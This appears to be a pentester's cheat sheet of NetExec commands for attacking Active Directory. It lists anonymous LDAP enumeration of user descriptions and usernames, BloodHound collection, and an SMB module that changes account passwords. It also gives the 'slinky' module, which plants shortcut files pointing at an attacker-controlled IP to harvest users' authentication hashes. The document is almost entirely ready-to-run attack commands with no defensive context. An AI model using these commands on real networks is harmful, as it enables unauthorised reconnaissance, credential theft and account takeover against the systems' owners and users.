View user description via LDAP:

```bash
nxc ldap <hostname> -u "" -p "" -M get-desc-users
```

Find usernames with LDAP:

```bash
nxc ldap <hostname> -u "" -p "" --users
```

```bash
nxc ldap <hostname> -u "" -p "" --query "(sAMAccountName=*)" "" | grep userPrincipalName
```

Bloodhound:

```bash
nxc ldap <ip> -u <user> -p <pass> -d <domain> --dns-server <dnsip> --bloodhound --collection All
```

Change password:

```bash
nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
```

Slinky:

```bash
netexec smb <ip> -u user -p pass -M slinky -o NAME=test SERVER=<your_IP>
```
